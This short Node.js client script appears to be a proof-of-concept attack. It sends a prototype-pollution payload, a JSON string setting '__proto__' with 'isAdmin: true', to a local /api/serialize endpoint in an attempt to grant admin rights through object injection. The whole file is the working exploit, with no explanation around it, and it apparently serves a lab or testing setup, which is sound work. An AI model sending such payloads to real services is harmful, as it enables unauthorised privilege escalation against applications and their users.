// client.js
const request = require('request');

const serializedPayload = '{"__proto__":{"isAdmin":true}}'; // Serialized payload with injected object

request.post({
    url: 'http://localhost:3000/api/serialize',
    json: { data: serializedPayload }
}, (error, response, body) => {
    if (error) {
        console.error('Error:', error);
    } else {
        console.log('Response:', body);
    }
});
